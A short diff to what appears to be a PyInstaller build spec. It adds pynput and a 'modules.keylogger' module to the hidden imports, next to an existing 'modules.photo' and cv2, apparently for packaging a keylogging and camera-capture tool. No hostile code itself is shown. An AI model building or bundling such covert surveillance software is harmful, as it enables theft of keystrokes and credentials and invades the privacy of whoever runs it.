@@ -15,7 +15,10 @@ a = Analysis(
         'ctypes.wintypes',
         'protocol',
         'cv2',
-        'modules.photo'
+        'modules.photo',
+        'pynput',
+        'pynput.keyboard',
+        'modules.keylogger'
     ],
     hookspath=[],
     hooksconfig={},
